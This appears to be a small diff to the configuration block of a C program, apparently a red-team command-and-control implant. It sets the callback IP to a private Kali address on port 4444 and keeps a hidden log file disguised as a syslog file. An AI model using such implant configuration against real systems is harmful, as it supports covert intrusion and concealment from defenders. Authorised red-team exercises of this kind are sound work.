@@ -10,7 +10,7 @@
 #include <arpa/inet.h>
 
 // ── CONFIG ──────────────────────────────────────────────
-#define C2_IP   "10.100.1.X"   // your Kali red team IP
+#define C2_IP   "192.168.1.79"   // your Kali red team IP
 #define C2_PORT 4444
 #define LOG_PATH "/var/lib/.cache/syslog_aux"  // hidden local log
 // ────────────────────────────────────────────────────────
